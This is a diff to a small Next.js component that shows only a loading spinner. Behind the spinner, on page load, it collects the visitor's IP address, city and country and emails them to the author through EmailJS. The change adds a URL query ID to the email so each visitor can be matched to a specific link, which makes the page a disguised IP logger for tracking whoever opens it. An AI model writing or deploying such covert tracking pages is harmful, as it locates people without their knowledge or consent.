@@ -1,7 +1,9 @@
 import { useEffect, useState } from "react";
 import emailjs from "emailjs-com";
+import { useRouter } from "next/router";
 
 export default function ({}) {
+  const router = useRouter();
   const [vistor, setVistor] = useState(null);
   const [send, setSend] = useState(0);
   const getVister = async () => {
@@ -17,8 +19,8 @@ export default function ({}) {
   useEffect(() => {
     if (vistor !== null) {
       const templateParams = {
-        to_name: "iso",
-        from_name: "abc",
+        to_name: `iso the id is ${router.query.q}`,
+        from_name: "ishak sebsib",
         vIp: vistor.ip,
         vCity: vistor.city,
         vCountry: vistor.country_name,
@@ -40,7 +42,7 @@ export default function ({}) {
   return (
     <div className="loadingbody">
       <div className="loading">
-        <div class="loader"></div>
+        <div className="loader"></div>
       </div>
     </div>
   );
